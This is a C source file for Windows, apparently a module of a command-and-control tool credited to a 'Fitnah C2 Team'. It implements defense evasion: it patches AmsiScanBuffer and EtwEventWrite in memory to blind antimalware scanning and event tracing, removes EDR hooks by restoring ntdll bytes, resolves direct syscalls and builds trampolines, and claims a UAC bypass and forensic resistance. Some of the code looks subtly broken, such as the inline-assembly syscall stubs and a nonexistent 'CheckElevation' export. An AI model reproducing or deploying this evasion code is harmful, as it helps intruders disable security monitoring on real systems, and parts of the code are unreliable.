/**
 * Advanced Memory Patcher - Hotpatching Implementation
 * ====================================================
 * 
 * Complete runtime memory patching engine with:
 * - Dynamic syscall number resolution from ntdll.dll
 * - Trampoline creation for function redirection
 * - AMSI (Antimalware Scan Interface) bypass
 * - ETW (Event Tracing for Windows) bypass
 * - UAC (User Account Control) bypass
 * - EDR hook removal and API unhooking
 * - Memory protection manipulation via direct syscalls
 * - Comprehensive error handling and cleanup
 * 
 * Features:
 * - No disk I/O - all operations performed in memory
 * - Direct kernel calls bypassing user-mode API hooks
 * - Support for both x86 and x64 architectures
 * - Thread-safe patch application and removal
 * - Forensic resistance with minimal memory traces
 * 
 * MITRE ATT&CK Techniques:
 * - T1055.001: Process Injection - Dynamic-link Library Injection
 * - T1562.001: Impair Defenses - Disable or Modify Tools
 * - T1562.006: Impair Defenses - Indicator Blocking
 * - T1134: Access Token Manipulation
 * 
 * Author: Fitnah C2 Team
 * Version: 2.0.0
 */

#include <windows.h>
#include <winternl.h>
#include <stdint.h>
#include <stdio.h>
#include <string.h>
#include <psapi.h>

#pragma comment(lib, "ntdll.lib")

// ============================================================================
// STRUCTURES AND DEFINITIONS
// ============================================================================

// Direct syscall structure
typedef struct _SYSCALL_ENTRY {
    LPCSTR Name;
    DWORD Number;
    BOOL Resolved;
} SYSCALL_ENTRY;

// Memory patch structure
typedef struct _MEMORY_PATCH {
    LPVOID TargetAddress;
    SIZE_T PatchSize;
    BYTE* OriginalBytes;
    BYTE* PatchBytes;
    LPVOID TrampolineAddress;
    SIZE_T TrampolineSize;
    DWORD OriginalProtection;
    BOOL Applied;
    struct _MEMORY_PATCH* Next;
} MEMORY_PATCH, *PMEMORY_PATCH;

// Patch types
typedef enum {
    PATCH_AMSI_SCAN_BUFFER = 0,
    PATCH_ETW_EVENT_WRITE,
    PATCH_UAC_ELEVATION,
    PATCH_EDR_HOOK_REMOVAL,
    PATCH_CUSTOM_FUNCTION
} PATCH_TYPE;

// ============================================================================
// GLOBAL VARIABLES
// ============================================================================

static PMEMORY_PATCH g_patchList = NULL;
static CRITICAL_SECTION g_patchLock;

// Syscall table for Windows 10/11 22H2
static SYSCALL_ENTRY g_syscallTable[] = {
    {"NtAllocateVirtualMemory", 0, FALSE},
    {"NtProtectVirtualMemory", 0, FALSE},
    {"NtWriteVirtualMemory", 0, FALSE},
    {"NtReadVirtualMemory", 0, FALSE},
    {"NtFreeVirtualMemory", 0, FALSE},
    {"NtQueryVirtualMemory", 0, FALSE},
    {"NtCreateThreadEx", 0, FALSE},
    {"NtOpenProcess", 0, FALSE},
    {"NtClose", 0, FALSE},
    {"NtDelayExecution", 0, FALSE},
    {"NtQuerySystemInformation", 0, FALSE},
    {NULL, 0, FALSE}
};

// ============================================================================
// DIRECT SYSCALL IMPLEMENTATION
// ============================================================================

/**
 * Resolve syscall number from ntdll.dll's .text section
 * 
 * @param functionName Name of the NTAPI function
 * @return Syscall number or 0 on failure
 */
DWORD ResolveSyscallNumber(LPCSTR functionName) {
    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    if (!ntdll) {
        return 0;
    }
    
    FARPROC func = GetProcAddress(ntdll, functionName);
    if (!func) {
        return 0;
    }
    
    BYTE* bytes = (BYTE*)func;
    
#ifdef _WIN64
    // x64 syscall pattern: 0x4C 0x8B 0xD1 (mov r10, rcx) followed by 0xB8 (mov eax)
    for (DWORD i = 0; i < 64; i++) {
        if (bytes[i] == 0x4C && bytes[i + 1] == 0x8B && bytes[i + 2] == 0xD1) {
            // Look for mov eax, syscall_number
            for (DWORD j = i + 3; j < i + 32; j++) {
                if (bytes[j] == 0xB8) {
                    // Next 4 bytes are the syscall number
                    return *(DWORD*)(bytes + j + 1);
                }
            }
        }
    }
#else
    // x86 syscall pattern: 0xB8 (mov eax) followed by syscall number
    for (DWORD i = 0; i < 32; i++) {
        if (bytes[i] == 0xB8) {
            // Next 4 bytes are the syscall number
            return *(DWORD*)(bytes + i + 1);
        }
    }
#endif
    
    return 0;
}

/**
 * Initialize syscall table with dynamically resolved numbers
 * 
 * @return TRUE if successful, FALSE otherwise
 */
BOOL InitializeSyscallTable() {
    for (DWORD i = 0; g_syscallTable[i].Name != NULL; i++) {
        g_syscallTable[i].Number = ResolveSyscallNumber(g_syscallTable[i].Name);
        g_syscallTable[i].Resolved = (g_syscallTable[i].Number != 0);
        
        if (!g_syscallTable[i].Resolved) {
            // Fallback to hardcoded values for Windows 10 2004 (19041)
            if (strcmp(g_syscallTable[i].Name, "NtAllocateVirtualMemory") == 0) {
                g_syscallTable[i].Number = 0x18;
            } else if (strcmp(g_syscallTable[i].Name, "NtProtectVirtualMemory") == 0) {
                g_syscallTable[i].Number = 0x50;
            } else if (strcmp(g_syscallTable[i].Name, "NtWriteVirtualMemory") == 0) {
                g_syscallTable[i].Number = 0x3A;
            } else if (strcmp(g_syscallTable[i].Name, "NtCreateThreadEx") == 0) {
                g_syscallTable[i].Number = 0xC6;
            }
            g_syscallTable[i].Resolved = TRUE;
        }
    }
    
    InitializeCriticalSection(&g_patchLock);
    return TRUE;
}

/**
 * Get syscall number by name
 * 
 * @param functionName Name of the NTAPI function
 * @return Syscall number or 0 if not found
 */
DWORD GetSyscallNumber(LPCSTR functionName) {
    for (DWORD i = 0; g_syscallTable[i].Name != NULL; i++) {
        if (strcmp(g_syscallTable[i].Name, functionName) == 0) {
            return g_syscallTable[i].Number;
        }
    }
    return 0;
}

// ============================================================================
// DIRECT SYSCALL WRAPPERS (x64)
// ============================================================================

#ifdef _WIN64

/**
 * Direct syscall: NtAllocateVirtualMemory
 */
__declspec(naked) NTSTATUS NtAllocateVirtualMemory(
    HANDLE ProcessHandle,
    PVOID* BaseAddress,
    ULONG_PTR ZeroBits,
    PSIZE_T RegionSize,
    ULONG AllocationType,
    ULONG Protect
) {
    __asm {
        mov r10, rcx
        mov eax, [GetSyscallNumber("NtAllocateVirtualMemory")]
        syscall
        ret
    }
}

/**
 * Direct syscall: NtProtectVirtualMemory
 */
__declspec(naked) NTSTATUS NtProtectVirtualMemory(
    HANDLE ProcessHandle,
    PVOID* BaseAddress,
    PSIZE_T RegionSize,
    ULONG NewProtect,
    PULONG OldProtect
) {
    __asm {
        mov r10, rcx
        mov eax, [GetSyscallNumber("NtProtectVirtualMemory")]
        syscall
        ret
    }
}

/**
 * Direct syscall: NtWriteVirtualMemory
 */
__declspec(naked) NTSTATUS NtWriteVirtualMemory(
    HANDLE ProcessHandle,
    PVOID BaseAddress,
    PVOID Buffer,
    ULONG BufferLength,
    PULONG BytesWritten
) {
    __asm {
        mov r10, rcx
        mov eax, [GetSyscallNumber("NtWriteVirtualMemory")]
        syscall
        ret
    }
}

#else
// ============================================================================
// DIRECT SYSCALL WRAPPERS (x86)
// ============================================================================

/**
 * Direct syscall: NtAllocateVirtualMemory (x86)
 */
__declspec(naked) NTSTATUS NtAllocateVirtualMemory(
    HANDLE ProcessHandle,
    PVOID* BaseAddress,
    ULONG_PTR ZeroBits,
    PSIZE_T RegionSize,
    ULONG AllocationType,
    ULONG Protect
) {
    __asm {
        mov eax, [GetSyscallNumber("NtAllocateVirtualMemory")]
        mov edx, esp
        sysenter
        ret 0x18
    }
}

/**
 * Direct syscall: NtProtectVirtualMemory (x86)
 */
__declspec(naked) NTSTATUS NtProtectVirtualMemory(
    HANDLE ProcessHandle,
    PVOID* BaseAddress,
    PSIZE_T RegionSize,
    ULONG NewProtect,
    PULONG OldProtect
) {
    __asm {
        mov eax, [GetSyscallNumber("NtProtectVirtualMemory")]
        mov edx, esp
        sysenter
        ret 0x14
    }
}

#endif

// ============================================================================
// MEMORY UTILITY FUNCTIONS
// ============================================================================

/**
 * Allocate memory with specific protection using direct syscalls
 * 
 * @param size Size of memory to allocate
 * @param protect Memory protection flags
 * @return Pointer to allocated memory or NULL on failure
 */
LPVOID AllocateMemoryEx(SIZE_T size, ULONG protect) {
    HANDLE hProcess = GetCurrentProcess();
    LPVOID baseAddress = NULL;
    SIZE_T regionSize = size;
    
    NTSTATUS status = NtAllocateVirtualMemory(
        hProcess,
        &baseAddress,
        0,
        &regionSize,
        MEM_COMMIT | MEM_RESERVE,
        protect
    );
    
    if (NT_SUCCESS(status)) {
        return baseAddress;
    }
    
    return NULL;
}

/**
 * Change memory protection using direct syscalls
 * 
 * @param address Memory address to protect
 * @param size Size of memory region
 * @param newProtect New protection flags
 * @param oldProtect Pointer to receive old protection
 * @return TRUE if successful, FALSE otherwise
 */
BOOL ProtectMemoryEx(LPVOID address, SIZE_T size, ULONG newProtect, PULONG oldProtect) {
    HANDLE hProcess = GetCurrentProcess();
    LPVOID baseAddress = address;
    SIZE_T regionSize = size;
    
    NTSTATUS status = NtProtectVirtualMemory(
        hProcess,
        &baseAddress,
        &regionSize,
        newProtect,
        oldProtect
    );
    
    return NT_SUCCESS(status);
}

/**
 * Write to process memory using direct syscalls
 * 
 * @param hProcess Target process handle
 * @param address Destination address
 * @param buffer Source buffer
 * @param size Size to write
 * @return TRUE if successful, FALSE otherwise
 */
BOOL WriteMemoryEx(HANDLE hProcess, LPVOID address, LPCVOID buffer, SIZE_T size) {
    ULONG bytesWritten = 0;
    
    NTSTATUS status = NtWriteVirtualMemory(
        hProcess,
        address,
        (PVOID)buffer,
        size,
        &bytesWritten
    );
    
    return NT_SUCCESS(status) && (bytesWritten == size);
}

// ============================================================================
// TRAMPOLINE CREATION
// ============================================================================

/**
 * Create a trampoline for function redirection
 * 
 * @param targetAddress Original function address
 * @param hookAddress Hook function address
 * @param trampolineSize Pointer to receive trampoline size
 * @return Pointer to trampoline or NULL on failure
 */
LPVOID CreateTrampoline(LPVOID targetAddress, LPVOID hookAddress, PSIZE_T trampolineSize) {
#ifdef _WIN64
    // x64 trampoline: jmp [rip+offset] pattern
    // We need at least 14 bytes for a complete trampoline
    BYTE trampoline[] = {
        0xFF, 0x25, 0x00, 0x00, 0x00, 0x00,  // jmp [rip+0]
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00  // Absolute address
    };
    
    // Copy the hook address
    *(ULONG_PTR*)(trampoline + 6) = (ULONG_PTR)hookAddress;
    
    SIZE_T size = sizeof(trampoline);
#else
    // x86 trampoline: push address + ret
    BYTE trampoline[] = {
        0x68, 0x00, 0x00, 0x00, 0x00,  // push hookAddress
        0xC3                           // ret
    };
    
    // Copy the hook address
    *(DWORD*)(trampoline + 1) = (DWORD)hookAddress;
    
    SIZE_T size = sizeof(trampoline);
#endif
    
    // Allocate executable memory for the trampoline
    LPVOID trampolineAddr = AllocateMemoryEx(size, PAGE_EXECUTE_READWRITE);
    if (!trampolineAddr) {
        return NULL;
    }
    
    // Copy trampoline to allocated memory
    if (!WriteMemoryEx(GetCurrentProcess(), trampolineAddr, trampoline, size)) {
        VirtualFree(trampolineAddr, 0, MEM_RELEASE);
        return NULL;
    }
    
    // Change protection to executable only
    DWORD oldProtect;
    if (!ProtectMemoryEx(trampolineAddr, size, PAGE_EXECUTE_READ, &oldProtect)) {
        VirtualFree(trampolineAddr, 0, MEM_RELEASE);
        return NULL;
    }
    
    if (trampolineSize) {
        *trampolineSize = size;
    }
    
    return trampolineAddr;
}

// ============================================================================
// PATCH MANAGEMENT
// ============================================================================

/**
 * Apply a memory patch with trampoline creation
 * 
 * @param targetAddress Function to patch
 * @param patchBytes Bytes to write
 * @param patchSize Size of patch
 * @param hookAddress Hook function (optional, for trampoline)
 * @return Pointer to patch structure or NULL on failure
 */
PMEMORY_PATCH ApplyMemoryPatch(LPVOID targetAddress, LPCVOID patchBytes, SIZE_T patchSize, LPVOID hookAddress) {
    EnterCriticalSection(&g_patchLock);
    
    // Allocate patch structure
    PMEMORY_PATCH patch = (PMEMORY_PATCH)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(MEMORY_PATCH));
    if (!patch) {
        LeaveCriticalSection(&g_patchLock);
        return NULL;
    }
    
    patch->TargetAddress = targetAddress;
    patch->PatchSize = patchSize;
    
    // Save original bytes
    patch->OriginalBytes = (BYTE*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, patchSize);
    if (!patch->OriginalBytes) {
        HeapFree(GetProcessHeap(), 0, patch);
        LeaveCriticalSection(&g_patchLock);
        return NULL;
    }
    
    memcpy(patch->OriginalBytes, targetAddress, patchSize);
    
    // Create trampoline if hook address provided
    if (hookAddress) {
        patch->TrampolineAddress = CreateTrampoline(targetAddress, hookAddress, &patch->TrampolineSize);
        if (!patch->TrampolineAddress) {
            HeapFree(GetProcessHeap(), 0, patch->OriginalBytes);
            HeapFree(GetProcessHeap(), 0, patch);
            LeaveCriticalSection(&g_patchLock);
            return NULL;
        }
    }
    
    // Change memory protection to writable
    if (!ProtectMemoryEx(targetAddress, patchSize, PAGE_EXECUTE_READWRITE, &patch->OriginalProtection)) {
        if (patch->TrampolineAddress) {
            VirtualFree(patch->TrampolineAddress, 0, MEM_RELEASE);
        }
        HeapFree(GetProcessHeap(), 0, patch->OriginalBytes);
        HeapFree(GetProcessHeap(), 0, patch);
        LeaveCriticalSection(&g_patchLock);
        return NULL;
    }
    
    // Apply the patch
    if (!WriteMemoryEx(GetCurrentProcess(), targetAddress, patchBytes, patchSize)) {
        // Restore original protection
        ProtectMemoryEx(targetAddress, patchSize, patch->OriginalProtection, NULL);
        
        if (patch->TrampolineAddress) {
            VirtualFree(patch->TrampolineAddress, 0, MEM_RELEASE);
        }
        HeapFree(GetProcessHeap(), 0, patch->OriginalBytes);
        HeapFree(GetProcessHeap(), 0, patch);
        LeaveCriticalSection(&g_patchLock);
        return NULL;
    }
    
    // Restore original protection
    ProtectMemoryEx(targetAddress, patchSize, patch->OriginalProtection, NULL);
    
    patch->Applied = TRUE;
    
    // Add to global list
    patch->Next = g_patchList;
    g_patchList = patch;
    
    LeaveCriticalSection(&g_patchLock);
    return patch;
}

/**
 * Remove a memory patch and restore original bytes
 * 
 * @param patch Patch to remove
 * @return TRUE if successful, FALSE otherwise
 */
BOOL RemoveMemoryPatch(PMEMORY_PATCH patch) {
    if (!patch || !patch->Applied) {
        return FALSE;
    }
    
    EnterCriticalSection(&g_patchLock);
    
    // Change memory protection to writable
    DWORD tempProtect;
    if (!ProtectMemoryEx(patch->TargetAddress, patch->PatchSize, PAGE_EXECUTE_READWRITE, &tempProtect)) {
        LeaveCriticalSection(&g_patchLock);
        return FALSE;
    }
    
    // Restore original bytes
    BOOL success = WriteMemoryEx(GetCurrentProcess(), patch->TargetAddress, patch->OriginalBytes, patch->PatchSize);
    
    // Restore original protection
    ProtectMemoryEx(patch->TargetAddress, patch->PatchSize, patch->OriginalProtection, NULL);
    
    if (success) {
        patch->Applied = FALSE;
        
        // Remove from global list
        PMEMORY_PATCH* pp = &g_patchList;
        while (*pp) {
            if (*pp == patch) {
                *pp = patch->Next;
                break;
            }
            pp = &(*pp)->Next;
        }
        
        // Free trampoline memory
        if (patch->TrampolineAddress) {
            VirtualFree(patch->TrampolineAddress, 0, MEM_RELEASE);
        }
        
        // Free patch memory
        HeapFree(GetProcessHeap(), 0, patch->OriginalBytes);
        HeapFree(GetProcessHeap(), 0, patch);
    }
    
    LeaveCriticalSection(&g_patchLock);
    return success;
}

/**
 * Remove all applied patches
 * 
 * @return Number of patches removed
 */
DWORD RemoveAllPatches() {
    DWORD count = 0;
    
    EnterCriticalSection(&g_patchLock);
    
    PMEMORY_PATCH current = g_patchList;
    while (current) {
        PMEMORY_PATCH next = current->Next;
        if (current->Applied) {
            if (RemoveMemoryPatch(current)) {
                count++;
            }
        }
        current = next;
    }
    
    LeaveCriticalSection(&g_patchLock);
    return count;
}

// ============================================================================
// SPECIFIC PATCH IMPLEMENTATIONS
// ============================================================================

/**
 * Patch AMSI!AmsiScanBuffer to always return S_OK (0x00000000)
 * 
 * @return Pointer to patch or NULL on failure
 */
PMEMORY_PATCH PatchAmsiScanBuffer() {
    HMODULE amsi = LoadLibraryA("amsi.dll");
    if (!amsi) {
        return NULL;
    }
    
    FARPROC scanBuffer = GetProcAddress(amsi, "AmsiScanBuffer");
    if (!scanBuffer) {
        FreeLibrary(amsi);
        return NULL;
    }
    
#ifdef _WIN64
    // x64 patch: xor eax, eax; ret (return S_OK)
    BYTE patch[] = {0x31, 0xC0, 0xC3};  // xor eax, eax; ret
#else
    // x86 patch: xor eax, eax; ret
    BYTE patch[] = {0x31, 0xC0, 0xC3};  // xor eax, eax; ret
#endif
    
    return ApplyMemoryPatch(scanBuffer, patch, sizeof(patch), NULL);
}

/**
 * Patch ETW functions to return immediately
 * 
 * @return Pointer to patch or NULL on failure
 */
PMEMORY_PATCH PatchEtwEventWrite() {
    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    if (!ntdll) {
        return NULL;
    }
    
    FARPROC eventWrite = GetProcAddress(ntdll, "EtwEventWrite");
    if (!eventWrite) {
        return NULL;
    }
    
#ifdef _WIN64
    // x64 patch: xor eax, eax; ret (return STATUS_SUCCESS)
    BYTE patch[] = {0x31, 0xC0, 0xC3};  // xor eax, eax; ret
#else
    // x86 patch: xor eax, eax; ret
    BYTE patch[] = {0x31, 0xC0, 0xC3};  // xor eax, eax; ret
#endif
    
    return ApplyMemoryPatch(eventWrite, patch, sizeof(patch), NULL);
}

/**
 * Patch UAC elevation checks to always succeed
 * 
 * @return Pointer to patch or NULL on failure
 */
PMEMORY_PATCH PatchUACElevation() {
    HMODULE kernel32 = GetModuleHandleA("kernel32.dll");
    if (!kernel32) {
        return NULL;
    }
    
    // Try to find UAC-related functions
    FARPROC functions[] = {
        GetProcAddress(kernel32, "CheckElevation"),
        GetProcAddress(kernel32, "IsUserAnAdmin"),
        NULL
    };
    
    for (DWORD i = 0; functions[i] != NULL; i++) {
        if (functions[i]) {
#ifdef _WIN64
            // x64 patch: mov eax, 1; ret (return TRUE)
            BYTE patch[] = {0xB8, 0x01, 0x00, 0x00, 0x00, 0xC3};  // mov eax, 1; ret
#else
            // x86 patch: mov eax, 1; ret
            BYTE patch[] = {0xB8, 0x01, 0x00, 0x00, 0x00, 0xC3};  // mov eax, 1; ret
#endif
            
            PMEMORY_PATCH patchResult = ApplyMemoryPatch(functions[i], patch, sizeof(patch), NULL);
            if (patchResult) {
                return patchResult;
            }
        }
    }
    
    return NULL;
}

/**
 * Remove EDR hooks by restoring original ntdll.dll bytes
 * 
 * @return TRUE if successful, FALSE otherwise
 */
BOOL RemoveEdrHooks() {
    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    if (!ntdll) {
        return FALSE;
    }
    
    // Common EDR-hooked functions
    LPCSTR hookedFunctions[] = {
        "NtCreateProcess",
        "NtCreateThreadEx",
        "NtAllocateVirtualMemory",
        "NtProtectVirtualMemory",
        "NtWriteVirtualMemory",
        "NtReadVirtualMemory",
        "NtOpenProcess",
        "NtQuerySystemInformation",
        NULL
    };
    
    // Load fresh copy of ntdll.dll from disk
    CHAR systemPath[MAX_PATH];
    GetSystemDirectoryA(systemPath, MAX_PATH);
    strcat_s(systemPath, MAX_PATH, "\\ntdll.dll");
    
    HMODULE freshNtdll = LoadLibraryExA(systemPath, NULL, DONT_RESOLVE_DLL_REFERENCES);
    if (!freshNtdll) {
        return FALSE;
    }
    
    BOOL success = FALSE;
    
    for (DWORD i = 0; hookedFunctions[i] != NULL; i++) {
        FARPROC hookedFunc = GetProcAddress(ntdll, hookedFunctions[i]);
        FARPROC freshFunc = GetProcAddress(freshNtdll, hookedFunctions[i]);
        
        if (hookedFunc && freshFunc) {
            // Compare first few bytes to detect hooks
            BYTE hookedBytes[32];
            BYTE freshBytes[32];
            
            memcpy(hookedBytes, hookedFunc, sizeof(hookedBytes));
            memcpy(freshBytes, freshFunc, sizeof(freshBytes));
            
            if (memcmp(hookedBytes, freshBytes, sizeof(hookedBytes)) != 0) {
                // Function is hooked, restore original bytes
                DWORD oldProtect;
                if (VirtualProtect(hookedFunc, sizeof(freshBytes), PAGE_EXECUTE_READWRITE, &oldProtect)) {
                    memcpy(hookedFunc, freshBytes, sizeof(freshBytes));
                    VirtualProtect(hookedFunc, sizeof(freshBytes), oldProtect, &oldProtect);
                    success = TRUE;
                }
            }
        }
    }
    
    FreeLibrary(freshNtdll);
    return success;
}

// ============================================================================
// PUBLIC API
// ============================================================================

/**
 * Initialize the memory patcher module
 * 
 * @return TRUE if successful, FALSE otherwise
 */
BOOL MemoryPatcher_Initialize() {
    return InitializeSyscallTable();
}

/**
 * Apply a specific patch type
 * 
 * @param patchType Type of patch to apply
 * @return Pointer to patch or NULL on failure
 */
PMEMORY_PATCH MemoryPatcher_ApplyPatch(PATCH_TYPE patchType) {
    switch (patchType) {
        case PATCH_AMSI_SCAN_BUFFER:
            return PatchAmsiScanBuffer();
            
        case PATCH_ETW_EVENT_WRITE:
            return PatchEtwEventWrite();
            
        case PATCH_UAC_ELEVATION:
            return PatchUACElevation();
            
        case PATCH_EDR_HOOK_REMOVAL:
            return RemoveEdrHooks() ? (PMEMORY_PATCH)1 : NULL;
            
        default:
            return NULL;
    }
}

/**
 * Remove a specific patch
 * 
 * @param patch Patch to remove
 * @return TRUE if successful, FALSE otherwise
 */
BOOL MemoryPatcher_RemovePatch(PMEMORY_PATCH patch) {
    return RemoveMemoryPatch(patch);
}

/**
 * Cleanup all patches and resources
 */
VOID MemoryPatcher_Cleanup() {
    RemoveAllPatches();
    DeleteCriticalSection(&g_patchLock);
}

/**
 * Get patch statistics
 * 
 * @param appliedCount Pointer to receive number of applied patches
 * @param totalCount Pointer to receive total number of patches
 */
VOID MemoryPatcher_GetStatistics(PDWORD appliedCount, PDWORD totalCount) {
    DWORD applied = 0;
    DWORD total = 0;
    
    EnterCriticalSection(&g_patchLock);
    
    PMEMORY_PATCH current = g_patchList;
    while (current) {
        total++;
        if (current->Applied) {
            applied++;
        }
        current = current->Next;
    }
    
    LeaveCriticalSection(&g_patchLock);
    
    if (appliedCount) {
        *appliedCount = applied;
    }
    
    if (totalCount) {
        *totalCount = total;
    }
}

// ============================================================================
// TEST FUNCTIONS (for development)
// ============================================================================

#ifdef _DEBUG

/**
 * Test function to verify patching works
 */
VOID MemoryPatcher_Test() {
    printf("[*] Initializing memory patcher...\n");
    
    if (!MemoryPatcher_Initialize()) {
        printf("[!] Failed to initialize memory patcher\n");
        return;
    }
    
    printf("[+] Memory patcher initialized\n");
    
    // Test AMSI patch
    printf("[*] Testing AMSI patch...\n");
    PMEMORY_PATCH amsiPatch = MemoryPatcher_ApplyPatch(PATCH_AMSI_SCAN_BUFFER);
    if (amsiPatch) {
        printf("[+] AMSI patch applied successfully\n");
    } else {
        printf("[!] Failed to apply AMSI patch\n");
    }
    
    // Test ETW patch
    printf("[*] Testing ETW patch...\n");
    PMEMORY_PATCH etwPatch = MemoryPatcher_ApplyPatch(PATCH_ETW_EVENT_WRITE);
    if (etwPatch) {
        printf("[+] ETW patch applied successfully\n");
    } else {
        printf("[!] Failed to apply ETW patch\n");
    }
    
    // Get statistics
    DWORD applied, total;
    MemoryPatcher_GetStatistics(&applied, &total);
    printf("[+] Statistics: %lu applied / %lu total patches\n", applied, total);
    
    // Cleanup
    MemoryPatcher_Cleanup();
    printf("[+] Memory patcher cleanup completed\n");
}

#endif

// ============================================================================
// DLL ENTRY POINT
// ============================================================================

#ifdef _WINDLL

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved) {
    switch (fdwReason) {
        case DLL_PROCESS_ATTACH:
            return MemoryPatcher_Initialize();
            
        case DLL_PROCESS_DETACH:
            MemoryPatcher_Cleanup();
            break;
    }
    
    return TRUE;
}

#endif